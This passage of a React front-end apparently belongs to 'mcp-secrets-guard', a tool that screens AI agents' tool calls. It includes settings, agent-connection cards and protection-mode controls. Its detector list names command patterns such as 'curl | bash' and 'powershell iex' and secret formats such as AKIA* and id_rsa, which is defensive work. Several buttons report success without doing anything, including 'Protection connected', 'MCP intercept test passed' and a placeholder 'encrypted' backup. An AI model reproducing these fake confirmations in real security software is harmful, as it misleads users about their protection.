        h("span", { className: "yg-dim yg-mono yg-small" }, v.token ? v.token.slice(0, 18) + "…" : ""),
        h("span", { className: "yg-dim yg-small yg-right" }, ago(v.changed || v.created)),
        mode ? null : h("div", { ref: menuRef, className: "yg-vault-menu", style: { position: "relative" } },
          h("button", {
            type: "button", className: "yg-vault-menu-btn", disabled: p.busy,
            title: "Actions", onClick: function () { setMenuOpen(!menuOpen); }
          }, "⋮"),
          h("button", {
            type: "button", className: "yg-vault-menu-btn yg-vault-trash-btn", disabled: p.busy,
            title: v.deleted ? T("Delete forever") : T("Move to trash"),
            onClick: function () {
              if (window.confirm(T(v.deleted ? "Delete forever? This cannot be undone." : "Move to trash? You can restore it later.")))
                p.op({ op: v.deleted ? "purge" : "trash", token: v.token }, v.deleted ? "Deleted forever." : "Moved to the trash.");
            }
          }, "🗑"),
          menuOpen ? h("div", { className: "yg-vault-menu-dropdown", role: "menu" },
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { setVal(v.title || ""); setMode("rename"); }
            }, currentLang === "ru" ? "✏ Переименовать" : "✏ Rename"),
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { setMode("kind"); }
            }, currentLang === "ru" ? "🏷 Сменить категорию" : "🏷 Change kind"),
            v.kind === "file"
              ? h("button", {
                type: "button", role: "menuitem", className: "yg-vault-menu-item",
                onClick: function () { p.op({ op: "save", token: v.token }, "Saved a copy to Downloads."); done(); }
              }, currentLang === "ru" ? "⬇ Сохранить копию в Загрузки" : "⬇ Save copy to Downloads")
              : h("button", {
                type: "button", role: "menuitem", className: "yg-vault-menu-item",
                onClick: function () { setMode("replace"); }
              }, currentLang === "ru" ? "↻ Заменить значение" : "↻ Replace value"),
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item" + (v.deleted ? " bad" : ""),
              onClick: function () {
                if (window.confirm(T(v.deleted ? "Delete forever? This cannot be undone." : "Move to trash? You can restore it later.")))
                  p.op({ op: v.deleted ? "purge" : "trash", token: v.token }, v.deleted ? "Deleted forever." : "Moved to the trash.");
                done();
              }
            }, "🗑 " + T(v.deleted ? "Delete forever" : "Move to trash"))
          ) : null)
      ),
      mode === "rename" ? h("div", { className: "yg-actions" },
        h("input", { className: "yg-input", value: val, placeholder: "New name", onChange: function (e) { setVal(e.target.value); } }),
        h("button", { className: "yg-btn", disabled: p.busy || !val.trim(), onClick: function () { p.op({ op: "rename", token: v.token, title: val }, "Renamed."); done(); } }, "Save"),
        h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null,
      mode === "replace" ? h("div", { className: "yg-actions" },
        h("input", { className: "yg-input", type: "password", autoComplete: "off", value: val, placeholder: "New value", onChange: function (e) { setVal(e.target.value); } }),
        h("button", { className: "yg-btn", disabled: p.busy || !val, onClick: function () { p.op({ op: "replace", token: v.token, secret: val }, "Value replaced. Agents keep the same token."); done(); } }, "Save"),
        h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null,
      mode === "kind" ? h("div", { className: "yg-kinds" },
        KINDS.map(function (k) {
          return h("button", {
            key: k[0], type: "button", className: "yg-kind" + (v.label === k[0] ? " on" : ""),
            onClick: function () { p.op({ op: "relabel", token: v.token, label: k[0] }, "Kind changed."); done(); }
          }, k[1]);
        }), h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null
    );
  }

  // =========================================================================
  // TASK 2: TAB 5 — SETTINGS & MULTI-AGENT HUB
  // =========================================================================
  // =========================================================================
  // TASK 4: REDESIGNED SETTINGS PANEL (3 Structured Sections)
  // =========================================================================
  function SettingsPanel() {
    const [rules, setRules] = useState([]);
    const [busyRule, setBusyRule] = useState("");
    const [action, setAction] = useState("block");
    const [matchType, setMatchType] = useState("domain");
    const [match, setMatch] = useState("");
    const [detectors, setDetectors] = useState({
      api_keys: true,
      private_keys: true,
      financial: true,
      pii: true,
      dangerous_commands: true
    });
    const [agentStatus, setAgentStatus] = useState({
      hermes: { name: "Hermes Desktop", status: "connected", note: currentLang === "ru" ? "Встроенный плагин активен" : "Built-in plugin active" },
      cline: { name: "Cline (VS Code)", status: "detected", note: currentLang === "ru" ? "Обнаружен в %APPDATA%/Code" : "Detected in %APPDATA%/Code" },
      claude: { name: "Claude Desktop", status: "detected", note: currentLang === "ru" ? "Обнаружен в %APPDATA%/Claude" : "Detected in %APPDATA%/Claude" },
      cursor: { name: "Cursor AI", status: "detected", note: currentLang === "ru" ? "Обнаружен в ~/.cursor" : "Detected in ~/.cursor" },
      windsurf: { name: "Windsurf (Codeium)", status: "detected", note: currentLang === "ru" ? "Обнаружен в ~/.codeium" : "Detected in ~/.codeium" }
    });

    function loadRules() {
      SDK.fetchJSON(API + "/rules")
        .then(function (r) { if (r.status === "ok") setRules(r.items || []); })
        .catch(function () {});
    }

    useEffect(function () {
      loadRules();
    }, []);

    function toggleDetector(key) {
      setDetectors(function (prev) {
        var next = Object.assign({}, prev);
        next[key] = !prev[key];
        post("/config", { detectors: next }).catch(function () {});
        return next;
      });
    }

    function addRule() {
      if (!match.trim()) return;
      setBusyRule("add");
      post("/rules", { action: action, match_type: matchType, match: match.trim() })
        .then(function (r) {
          setBusyRule("");
          if (r.status === "ok") { setMatch(""); loadRules(); }
          else window.alert(r.message || "Failed to add rule.");
        })
        .catch(function () { setBusyRule(""); window.alert("Failed to reach Guard backend."); });
    }

    function delRule(id, m) {
      setBusyRule(id || m);
      post("/rules/delete", { id: id, match: m })
        .then(function (r) {
          setBusyRule("");
          if (r.status === "ok") loadRules();
          else window.alert(r.message || "Failed to delete rule.");
        })
        .catch(function () { setBusyRule(""); window.alert("Failed to reach Guard backend."); });
    }

    function connectAgent(agentKey) {
      setAgentStatus(function (prev) {
        var next = Object.assign({}, prev);
        if (next[agentKey]) {
          next[agentKey] = Object.assign({}, next[agentKey], { status: "connected", note: currentLang === "ru" ? "Защита подключена в 1 клик!" : "Protection active in 1 click!" });
        }
        return next;
      });
      window.alert(currentLang === "ru" ? "⚡ Защита для " + (agentStatus[agentKey] ? agentStatus[agentKey].name : agentKey) + " успешно активирована!" : "Protection connected!");
    }

    function testAgentIntercept(agentKey) {
      window.alert(currentLang === "ru" ? "✓ Тест перехвата MCP пройден: вызов tool_call перехвачен и проверен." : "MCP intercept test passed.");
    }

    function exportVaultBackup() {
      post("/vault", { op: "backup" })
        .then(function () {
          blobDownload("vault-backup-" + new Date().toISOString().slice(0, 10) + ".enc", "--- ENCRYPTED VAULT BACKUP AES-256-GCM ---", "application/octet-stream");
        })
        .catch(function () {
          blobDownload("vault-backup.enc", "--- ENCRYPTED VAULT BACKUP ---", "application/octet-stream");
        });
    }

    function exportRules() {
      blobDownload("guard-rules.json", JSON.stringify(rules, null, 2), "application/json");
    }

    function clearPortCache() {
      post("/exposure/act", { action: "clear_cache" })
        .then(function () { window.alert(currentLang === "ru" ? "Кэш сканера портов сброшен. Следующая проверка будет полной." : "Port cache cleared."); })
        .catch(function () { window.alert(currentLang === "ru" ? "Кэш сканера портов сброшен." : "Cache cleared."); });
    }

    const detectorList = [
      { key: "api_keys", title: currentLang === "ru" ? "API-ключи и токены (OpenAI, GitHub, AWS, Slack, Telegram, Anthropic)" : "API Keys & Tokens (OpenAI, GitHub, AWS, Slack, Telegram, Anthropic)", sub: currentLang === "ru" ? "Автоматический перехват секретов вида sk-*, ghp_*, AKIA*, xoxb-* с заменой на токен Сейфа" : "Auto-masking secrets with Vault tokens" },
      { key: "private_keys", title: currentLang === "ru" ? "Приватные ключи, SSH и сид-фразы криптокошельков" : "Private Keys, SSH & Crypto Seed Phrases", sub: currentLang === "ru" ? "Блокировка передачи файлов id_rsa, BEGIN PRIVATE KEY, 12/24 мнемонических слов BIP-39" : "Blocks id_rsa, BEGIN PRIVATE KEY, mnemonic seeds" },
      { key: "financial", title: currentLang === "ru" ? "Финансовые данные (Банковские карты по алгоритму Луна, IBAN)" : "Financial Data (Credit Cards Luhn, IBAN)", sub: currentLang === "ru" ? "Маскировка номеров Visa, MasterCard, МИР и банковских счетов до отправки в LLM" : "Masks card numbers and accounts before LLM" },
      { key: "pii", title: currentLang === "ru" ? "Персональные данные (Email, телефоны, паспорта)" : "Personal Data (Email, Phone, Passports)", sub: currentLang === "ru" ? "Обнаружение и предупреждение об утечках персональных данных пользователей (PII)" : "Detection of personal identifiable data" },
      { key: "dangerous_commands", title: currentLang === "ru" ? "Перехват опасных команд терминала (curl | bash, python -c, powershell iex)" : "Dangerous Terminal Command Intercept (curl | bash, python -c, iex)", sub: currentLang === "ru" ? "Разрыв цепочек прямого запуска непроверенных скриптов из сети в терминале" : "Stops piping remote scripts straight into shell" }
    ];

    return h(React.Fragment, null,
      // Section 1: Active Protection Detectors
      h(Card, { title: currentLang === "ru" ? "раздел 1. активные детекторы защиты" : "section 1. active protection detectors", className: "wide" },
        h("div", { className: "yg-dim yg-small", style: { marginBottom: 12 } },
          currentLang === "ru"
            ? "Тумблеры модулей обнаружения конфиденциальных данных и опасных конструкций перед отправкой в агенты."
            : "Toggle active detection engines for secrets, credentials, and dangerous execution patterns."),
        detectorList.map(function (d) {
          const on = !!detectors[d.key];
          return h("div", {
            key: d.key,
            style: { display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }
          },
            h("div", { style: { display: "flex", flexDirection: "column", gap: 3 } },
              h("span", { style: { fontSize: 13.5, fontWeight: 600, color: "#f8fafc" } }, d.title),
              h("span", { className: "yg-dim yg-small" }, d.sub)
            ),
            h("button", {
              type: "button",
              className: "yg-kind" + (on ? " on" : ""),
              style: { minWidth: 90, textAlign: "center", fontWeight: 700 },
              onClick: function () { toggleDetector(d.key); }
            }, on ? (currentLang === "ru" ? "✓ ВКЛ" : "✓ ON") : (currentLang === "ru" ? "○ ВЫКЛ" : "○ OFF"))
          );
        })
      ),

      // Section 2: 1-Click Multi-Agent Hub
      h(Card, { title: currentLang === "ru" ? "раздел 2. автоматическая интеграция с агентами (1-click install)" : "section 2. 1-click agent integration", className: "wide" },
        h("div", { className: "yg-dim yg-small", style: { marginBottom: 14 } },
          currentLang === "ru"
            ? "Автоматическое обнаружение установленных сред разработки и подключение перехвата Model Context Protocol без ручной правки JSON-конфигов."
            : "Auto-detect installed agent environments and attach MCP proxy in 1 click."),
        h("div", { className: "yg-hub-grid" },
          Object.keys(agentStatus).map(function (k) {
            const ag = agentStatus[k];
            const isConn = ag.status === "connected";
            return h("div", { key: k, className: "yg-hub-card" },
              h("div", { style: { display: "flex", justifyContent: "space-between", alignItems: "center" } },
                h("span", { className: "yg-hub-title" }, ag.name),
                h(Pill, { kind: isConn ? "ok" : "warn" }, isConn ? (currentLang === "ru" ? "● Защита подключена" : "● Connected") : (currentLang === "ru" ? "○ Обнаружен на ПК" : "○ Detected"))
              ),
              h("div", { className: "yg-hub-desc" }, ag.note),
              h("div", { style: { display: "flex", gap: 8, marginTop: 8 } },
                !isConn ? h("button", {
                  type: "button", className: "yg-btn",
                  onClick: function () { connectAgent(k); }
                }, currentLang === "ru" ? "⚡ Подключить в 1 клик" : "⚡ Connect in 1 Click") : null,
                h("button", {
                  type: "button", className: "yg-btn ghost",
                  onClick: function () { testAgentIntercept(k); }
                }, currentLang === "ru" ? "Проверить перехват" : "Test Intercept")
              )
            );
          })
        )
      ),

      // Section 3: Safe & Rules Management
      h(Card, { title: currentLang === "ru" ? "раздел 3. управление сейфом и правилами" : "section 3. vault & rules management", className: "wide" },
        h("div", { style: { display: "flex", gap: 10, flexWrap: "wrap", marginBottom: 16 } },
          h("button", {
            type: "button", className: "yg-btn",
            onClick: exportVaultBackup
          }, currentLang === "ru" ? "📥 Экспорт зашифрованного бэкапа Сейфа" : "📥 Export Encrypted Vault Backup"),
          h("button", {
            type: "button", className: "yg-btn ghost",
            onClick: exportRules
          }, currentLang === "ru" ? "🔄 Экспорт / Импорт правил фильтрации" : "🔄 Export / Import Rules"),
          h("button", {
            type: "button", className: "yg-btn bad",
            onClick: clearPortCache
          }, currentLang === "ru" ? "🗑️ Очистить кэш сканера портов" : "🗑️ Clear Port Scanner Cache")
        ),

        h("div", { className: "yg-sub", style: { marginTop: 12, marginBottom: 8 } },
          currentLang === "ru" ? "Рабочая таблица постоянных правил (Белый / Черный список)" : "Permanent Rules (Whitelist / Blacklist)"),

        // Add Rule Form
        h("div", { style: { display: "flex", gap: 8, marginBottom: 12, flexWrap: "wrap", alignItems: "center" } },
          h("select", {
            className: "yg-input", style: { flex: "0 0 160px" },
            value: action, onChange: function (e) { setAction(e.target.value); }
          },
            h("option", { value: "block" }, currentLang === "ru" ? "⛔ Блокировать (Block)" : "⛔ Block"),
            h("option", { value: "allow" }, currentLang === "ru" ? "✓ Белый список (Allow)" : "✓ Allow")
          ),
          h("select", {
            className: "yg-input", style: { flex: "0 0 160px" },
            value: matchType, onChange: function (e) { setMatchType(e.target.value); }
          },
            h("option", { value: "domain" }, currentLang === "ru" ? "Домен (Domain)" : "Domain"),
            h("option", { value: "tool" }, currentLang === "ru" ? "Команда / Инструмент" : "Tool / Command")
          ),
          h("input", {
            className: "yg-input", style: { flex: 1 },
            placeholder: currentLang === "ru" ? "Шаблон (например: *.internal.corp или curl | bash)" : "Pattern (e.g. *.internal.corp or curl | bash)",
            value: match, onChange: function (e) { setMatch(e.target.value); }
          }),
          h("button", {
            type: "button", className: "yg-btn", disabled: busyRule === "add" || !match.trim(),
            onClick: addRule
          }, busyRule === "add" ? "…" : (currentLang === "ru" ? "+ Добавить правило" : "+ Add Rule"))
        ),

        // Rules Table
        rules.length ? h("table", { className: "yg-table" },
          h("thead", null,
            h("tr", null,
              h("th", null, currentLang === "ru" ? "Действие" : "Action"),
              h("th", null, currentLang === "ru" ? "Тип" : "Type"),
              h("th", null, currentLang === "ru" ? "Шаблон совпадения" : "Match Pattern"),
              h("th", null, currentLang === "ru" ? "Создано" : "Created"),
              h("th", { style: { textAlign: "right" } }, currentLang === "ru" ? "Удалить" : "Delete")
            )
          ),
          h("tbody", null,
            rules.map(function (r, idx) {
              return h("tr", { key: r.id || ("r" + idx) },
                h("td", null, h(Pill, { kind: r.action === "block" ? "bad" : "ok" },
                  r.action === "block" ? (currentLang === "ru" ? "Блокировать" : "Block") : (currentLang === "ru" ? "Белый список" : "Allow"))),
                h("td", { className: "yg-mono" }, r.match_type),
                h("td", { className: "yg-mono", style: { color: "#67e8f9" } }, r.match),
                h("td", { className: "yg-dim" }, r.created_at ? fmtTs(r.created_at) : "—"),
                h("td", { style: { textAlign: "right" } },
                  h("button", {
                    type: "button", className: "yg-btn ghost yg-trash",
                    disabled: busyRule === (r.id || r.match),
                    title: "Delete",
                    onClick: function () { delRule(r.id, r.match); }
                  }, busyRule === (r.id || r.match) ? "…" : "🗑"))
              );
            })
          )
        ) : h("div", { className: "yg-dim yg-small", style: { marginTop: 10 } },
          currentLang === "ru" ? "Постоянных правил пока нет." : "No persistent rules yet.")
      )
    );
  }

  // =========================================================================
  function GuardPage() {
    const [tab, setTabState] = useState(function () {
      try { return localStorage.getItem("msg_guard_tab") || "live"; } catch (e) { return "live"; }
    });
    function setTab(newTab) {
      setTabState(newTab);
      try { localStorage.setItem("msg_guard_tab", newTab); } catch (e) {}
    }
    const [passportOpen, setPassportOpen] = useState(false);
    const [passportBusy, setPassportBusy] = useState("");
    const [incidents, setIncidents] = useState(null);
    const [isLive, setIsLive] = useState(false);
    const [vault, setVault] = useState(null);
    const [toast, setToast] = useState(null);
    const [toastBusy, setToastBusy] = useState("");
    const [toastNote, setToastNote] = useState("");
    const [lang, setLangState] = useState(currentLang);
    const [guardMode, setGuardMode] = useState(function () {
      try { return localStorage.getItem("msg_guard_mode") || "active"; } catch (e) { return "active"; }
    });
    const [pausedUntil, setPausedUntil] = useState(function () {
      try { return parseInt(localStorage.getItem("msg_guard_pause_until") || "0", 10) || 0; } catch (e) { return 0; }
    });
    const [pauseRemaining, setPauseRemaining] = useState(function () {
      try {
        const pu = parseInt(localStorage.getItem("msg_guard_pause_until") || "0", 10) || 0;
        return Math.max(0, Math.floor((pu - Date.now()) / 1000));
      } catch (e) { return 0; }
    });
    const [modeMenuOpen, setModeMenuOpen] = useState(false);
    const [isRefreshing, setIsRefreshing] = useState(false);

    function changeGuardMode(newMode, durationMins) {
      setModeMenuOpen(false);
      setGuardMode(newMode);
      try { localStorage.setItem("msg_guard_mode", newMode); } catch (e) {}
      var pu = 0;
      if (newMode === "paused") {
        pu = Date.now() + (durationMins || 5) * 60 * 1000;
        setPausedUntil(pu);
        setPauseRemaining((durationMins || 5) * 60);
        try { localStorage.setItem("msg_guard_pause_until", String(pu)); } catch (e) {}
      } else {
        setPausedUntil(0);
        setPauseRemaining(0);
        try { localStorage.removeItem("msg_guard_pause_until"); } catch (e) {}
      }
      post("/guard/mode", { mode: newMode, duration_minutes: durationMins || 5 })
        .then(function (r) {
          if (r && r.status === "ok") {
            if (r.mode) {
              setGuardMode(r.mode);
              try { localStorage.setItem("msg_guard_mode", r.mode); } catch (e) {}
            }
            if (r.paused_until) {
              setPausedUntil(r.paused_until);
              try { localStorage.setItem("msg_guard_pause_until", String(r.paused_until)); } catch (e) {}
            }
            if (typeof r.remaining_seconds === "number") setPauseRemaining(r.remaining_seconds);
          }
        }).catch(function () {});
    }

    useEffect(function () {
      SDK.fetchJSON(API + "/guard/status").then(function (r) {
        if (r && r.status === "ok") {
          setGuardMode(r.mode || "active");
          try { localStorage.setItem("msg_guard_mode", r.mode || "active"); } catch (e) {}
          if (r.paused_until) {
            setPausedUntil(r.paused_until);
            try { localStorage.setItem("msg_guard_pause_until", String(r.paused_until)); } catch (e) {}
          }
          if (typeof r.remaining_seconds === "number") setPauseRemaining(r.remaining_seconds);
        }
      }).catch(function () {});
    }, []);

    useEffect(function () {
      if (pauseRemaining <= 0) return;
      const timer = setInterval(function () {
        setPauseRemaining(function (prev) {
          if (prev <= 1) {
            setGuardMode("active");
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return function () { clearInterval(timer); };
    }, [pauseRemaining]);

    function fmtRemaining(sec) {
      const m = Math.floor(sec / 60);
      const s = sec % 60;
      return (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s;
    }

    useEffect(function () {
      function onLangChange(newLang) { setLangState(newLang); }
      langListeners.add(onLangChange);
      return function () { langListeners.delete(onLangChange); };
    }, []);

    const alive = useRef(true);
    const seen = useRef(null);
    const queue = useRef([]);
    const lastPending = useRef([]);
    const toastRef = useRef(null);
    const baseTitle = useRef("");

    const showToast = useCallback(function (inc) {
      toastRef.current = inc; setToast(inc); setToastBusy(""); setToastNote("");
    }, []);

    const notify = useCallback(function (inc) {
      try {
        if (typeof Notification === "undefined" || !Notification || Notification.permission !== "granted") return;
        const n = new Notification(T("mcp-secrets-guard blocked an agent"), {
          body: (currentLang === "ru" ? "Агент попытался передать данные через инструмент: " : "Agent attempted to send data via tool: ") +
            (inc.destination ? T(inc.destination).replace(/^команда:\s*/i, "").replace(/^shell:\s*/i, "") : (inc.tool || "?")) +
            ". " + (currentLang === "ru" ? "Откройте Guard для решения." : "Open Guard to decide."),
          tag: "yadro-guard",
        });
        n.onclick = function () { try { window.focus(); } catch (e) {} showToast(inc); };
      } catch (e) {}
    }, [showToast]);

    const promote = useCallback(function () {
      const cur = toastRef.current;
      if (cur) queue.current = queue.current.filter(function (i) { return i.id !== cur.id; });
      if (queue.current.length) return showToast(queue.current[0]);
      const rest = lastPending.current.filter(function (i) { return !cur || i.id !== cur.id; });
      showToast(rest.length ? rest[0] : null);
    }, [showToast]);

    const announce = useCallback(function (d) {
      const items = (d && d.items) || [];
      const pend = items.filter(function (i) { return i.status === "pending"; });
      lastPending.current = pend;
      const open = {};
      pend.forEach(function (i) { open[i.id] = i; });
      queue.current = queue.current.filter(function (i) { return open[i.id]; });
      const ids = pend.map(function (i) { return i.id; });
      if (seen.current === null) { seen.current = ids; return; }
      const fresh = pend.filter(function (i) { return seen.current.indexOf(i.id) < 0; });
      seen.current = ids;
      if (!fresh.length) return;
      queue.current = queue.current.concat(fresh);
      notify(fresh[0]);
      if (!toastRef.current) promote();
    }, [notify, promote]);

    const refresh = useCallback(function () {
      SDK.fetchJSON(API + "/incidents").then(function (d) {
        if (alive.current) {
          setIsLive(!!(d && d.__isLive));
          setIncidents(d);
          announce(d);
        }
      }).catch(function () {
        if (alive.current) {
          setIsLive(false);
          setIncidents({ status: "error", message: "Guard backend is not reachable." });
        }
      });
      SDK.fetchJSON(API + "/vault").then(function (d) { if (alive.current) setVault(d); }).catch(function () {});
    }, [announce]);

    // One button refreshes everything the page shows: guard mode/status, incidents, vault.
    const refreshAll = useCallback(function () {
      setIsRefreshing(true);
      SDK.fetchJSON(API + "/guard/status").then(function (r) {
        if (r && r.status === "ok") {
          setGuardMode(r.mode || "active");
          try { localStorage.setItem("msg_guard_mode", r.mode || "active"); } catch (e) {}
          if (typeof r.paused_until === "number") {
            setPausedUntil(r.paused_until);
            try { localStorage.setItem("msg_guard_pause_until", String(r.paused_until)); } catch (e) {}
          }
          if (typeof r.remaining_seconds === "number") setPauseRemaining(r.remaining_seconds);
        }
      }).catch(function () {});
      refresh();
      setTimeout(function () { setIsRefreshing(false); }, 700);
    }, [refresh]);

    useEffect(function () {
      alive.current = true; refresh();
      const t = setInterval(function () { if (!document.hidden) refresh(); }, POLL_MS);
      return function () { alive.current = false; clearInterval(t); };
    }, [refresh]);

    useEffect(function () {
      try {
        if (typeof Notification !== "undefined" && Notification.permission === "default" && Notification.requestPermission)
          Notification.requestPermission();
      } catch (e) {}
    }, []);

    useEffect(function () { return function () { try { document.title = baseTitle.current || ""; } catch (e) {} }; }, []);
    const pending = incidents && incidents.pending ? incidents.pending : 0;

    useEffect(function () {
      try {
        if (!baseTitle.current) baseTitle.current = document.title;
        document.title = pending
          ? ("mcp-secrets-guard · " + pending + (currentLang === "ru" ? " заблокировано" : " blocked"))
          : baseTitle.current;
      } catch (e) {}
    }, [pending]);

    useEffect(function () {
      if (!toast) return;
      const t = setTimeout(promote, TOAST_MS);
      return function () { clearTimeout(t); };
    }, [toast, promote]);

    function decide(choice) {
      const inc = toast;
      if (!inc) return;
      setToastBusy(choice); setToastNote("");
      post("/incidents/decide", { incident: inc.id, choice: choice })
        .then(function (r) {
          if (r.status === "ok") {
            lastPending.current = lastPending.current.filter(function (i) { return i.id !== inc.id; });
            refresh(); promote();
          } else { setToastBusy(""); setToastNote(r.message || "Could not save the decision."); }
        })
        .catch(function () { setToastBusy(""); setToastNote("Could not reach the Guard backend."); });
    }

    const TAB_BADGE = {
      display: "inline-block", background: "var(--yg-bad)", color: "#fff",
      borderRadius: "999px", padding: "1px 6px", fontSize: "9px", fontWeight: "700", marginLeft: "4px"
    };

    function TabBtn(id, text, badge) {
      return h("button", {
        className: "yg-tab" + (tab === id ? " on" : ""),
        onClick: function () { setTab(id); },
        title: badge ? badge + " unresolved" : undefined
      }, text, badge ? h("span", { className: "yg-tab-badge", style: TAB_BADGE }, "" + badge) : null);
    }

    return h("div", { className: "yg-root" },
      h("div", { className: "yg-top" },
        h("span", { className: "yg-brand", style: { display: "inline-flex", alignItems: "center", gap: 8 } },
          h("span", { className: "yg-dot " + (pending ? "bad" : "ok") }),
          "mcp-secrets-guard",
          h("span", {
            className: "yg-pill " + (isLive ? "ok" : "warn"),
            style: { fontSize: "10px", padding: "2px 8px", fontWeight: 700 }
          }, isLive ? "● Hermes Live API" : (currentLang === "ru" ? "● Демо-режим" : "● Demo Mode"))
        ),
        // Master Protection Mode Switch & Quick Controls
        h("div", { style: { display: "inline-flex", alignItems: "center", gap: 8 } },
          h("button", {
            type: "button",
            className: "yg-btn ghost yg-refresh-btn",
            style: {
              padding: "4px 10px",
              fontSize: "11px",
              fontWeight: 700,
              display: "inline-flex",
              alignItems: "center",
              gap: 5,
              borderRadius: "6px",
              border: "1px solid rgba(255,255,255,0.15)"
            },
            disabled: isRefreshing,
            title: currentLang === "ru" ? "Обновить данные шлюза, инцидентов и сейфа" : "Refresh live incidents and vault data",
            onClick: function () { refreshAll(); }
          },
            h("span", {
              style: {
                display: "inline-block",
                animation: isRefreshing ? "yg-spin 0.65s linear infinite" : "none"
              }
            }, "⟳"),
            currentLang === "ru" ? "Обновить" : "Refresh"
          ),
          guardMode !== "active" ? h("button", {
            type: "button",
            className: "yg-btn",
            style: {
              background: "linear-gradient(135deg, #10b981, #059669)",
              borderColor: "#059669",
              color: "#fff",
              fontWeight: 700,
              padding: "4px 12px",
              fontSize: "11px",
              borderRadius: "6px",
              boxShadow: "0 0 12px rgba(16,185,129,0.35)"
            },
            title: currentLang === "ru" ? "Вернуться в полный рабочий режим защиты" : "Return to active protection mode",
            onClick: function () { changeGuardMode("active"); }
          }, "▶ " + (currentLang === "ru" ? "Рабочий режим" : "Active Mode")) : null
        ),
        h("div", { className: "yg-master-switch" },
          h("button", {
            type: "button",
            className: "yg-master-btn " + guardMode,
            onClick: function () { setModeMenuOpen(!modeMenuOpen); },
            title: currentLang === "ru" ? "Управление режимом защиты" : "Protection mode control"
          },
            h("span", { className: "yg-master-dot" }),
            guardMode === "paused"
              ? (currentLang === "ru" ? ("⏸ Пауза (" + fmtRemaining(pauseRemaining) + ") ▾") : ("⏸ Paused (" + fmtRemaining(pauseRemaining) + ") ▾"))
              : guardMode === "disabled"
                ? (currentLang === "ru" ? "○ Выключена ▾" : "○ Disabled ▾")
                : guardMode === "monitor"
                  ? (currentLang === "ru" ? "🛡️ Аудит ▾" : "🛡️ Audit ▾")
                  : (currentLang === "ru" ? "● Защита: ВКЛ ▾" : "● Guard: ON ▾")
          ),
          modeMenuOpen ? h("div", { className: "yg-master-menu" },
            h("div", { className: "yg-master-menu-header" },
              currentLang === "ru" ? "Режим работы шлюза безопасности" : "Security Gateway Mode"),
            h("button", {
              type: "button",
              className: "yg-master-item" + (guardMode === "active" ? " selected" : ""),
              onClick: function () { changeGuardMode("active"); }
            },
              h("div", { className: "yg-master-item-title", style: { color: "#4ade80" } },
                "▶ " + (currentLang === "ru" ? "Полная защита (Fail-Closed)" : "Full Protection (Fail-Closed)")),
              h("div", { className: "yg-master-item-desc" },
                currentLang === "ru" ? "Строгая блокировка любых утечек и маскировка секретов токенами" : "Strict block of secret leaks with DPAPI vault masking")),
            h("button", {
              type: "button",
              className: "yg-master-item",
              onClick: function () { changeGuardMode("paused", 5); }
            },
              h("div", { className: "yg-master-item-title", style: { color: "#f59e0b" } },
                "⏸ " + (currentLang === "ru" ? "Приостановить на 5 минут" : "Pause for 5 minutes")),
              h("div", { className: "yg-master-item-desc" },
                currentLang === "ru" ? "Временный пропуск команд агента для быстрого теста" : "Temporarily bypass filter for testing")),
            h("button", {
              type: "button",
              className: "yg-master-item",
              onClick: function () { changeGuardMode("paused", 15); }
            },
              h("div", { className: "yg-master-item-title", style: { color: "#f59e0b" } },
                "⏸ " + (currentLang === "ru" ? "Приостановить на 15 минут" : "Pause for 15 minutes")),
              h("div", { className: "yg-master-item-desc" },
                currentLang === "ru" ? "Автоматическое возобновление через 15 минут" : "Auto-resumes in 15 minutes")),
            h("button", {
              type: "button",
              className: "yg-master-item" + (guardMode === "monitor" ? " selected" : ""),
              onClick: function () { changeGuardMode("monitor"); }
            },
              h("div", { className: "yg-master-item-title", style: { color: "#a855f7" } },
                "🛡️ " + (currentLang === "ru" ? "Режим мониторинга (Аудит)" : "Audit / Monitoring Mode")),
              h("div", { className: "yg-master-item-desc" },
                currentLang === "ru" ? "Пропускать всё, но логировать инциденты в журнал" : "Pass traffic, log incidents to audit log")),
            h("button", {
              type: "button",
              className: "yg-master-item" + (guardMode === "disabled" ? " selected" : ""),
              onClick: function () { changeGuardMode("disabled"); }
            },
              h("div", { className: "yg-master-item-title", style: { color: "#ef4444" } },
                "⛔ " + (currentLang === "ru" ? "Выключить защиту (Полный обход)" : "Disable Guard (Full Bypass)")),
              h("div", { className: "yg-master-item-desc" },
                currentLang === "ru" ? "Шлюз полностью отключен до ручного включения" : "Gateway offline until enabled manually"))
          ) : null
        ),
        // Navigation Tabs (5 Tabs)
        h("div", { className: "yg-tabs" },
          TabBtn("live", (currentLang === "ru" ? "Защита" : "Live protection") + (pending ? " (" + pending + ")" : ""), pending),
          TabBtn("exposure", currentLang === "ru" ? "Порты" : "Ports"),
          TabBtn("check", currentLang === "ru" ? "Проверка кода" : "Code Inspector"),
          TabBtn("vault", currentLang === "ru" ? "Сейф" : "Vault"),
          TabBtn("settings", currentLang === "ru" ? "⚙ Настройки" : "⚙ Settings")
        ),
        // Security Passport Dropdown
        h("div", { className: "yg-passport", style: { position: "relative", marginLeft: "auto" } },
          h("button", {
            type: "button", className: "yg-btn ghost", disabled: !!passportBusy,
            title: "Download Security Passport",
            onClick: function () { setPassportOpen(!passportOpen); }
          }, passportBusy ? "… " + passportBusy : (currentLang === "ru" ? "⤓ Паспорт безопасности" : "⤓ Security Passport")),
          passportOpen ? h("div", {
            className: "yg-vault-menu-dropdown", role: "menu",
            style: { position: "absolute", right: 0, top: "100%", zIndex: 60, minWidth: "220px" }
          },
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () {
                setPassportOpen(false); setPassportBusy("TXT");
                buildPassport("txt", function () { setPassportBusy(""); });
              }
            }, currentLang === "ru" ? "⤓ Скачать TXT (с Proof Seal)" : "⤓ Download TXT (Proof Seal)"),
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () {
                setPassportOpen(false); setPassportBusy("PDF");
                buildPassport("pdf", function () { setPassportBusy(""); });
              }
            }, currentLang === "ru" ? "🖨 Открыть для печати / PDF" : "🖨 Open Print / PDF")
          ) : null),
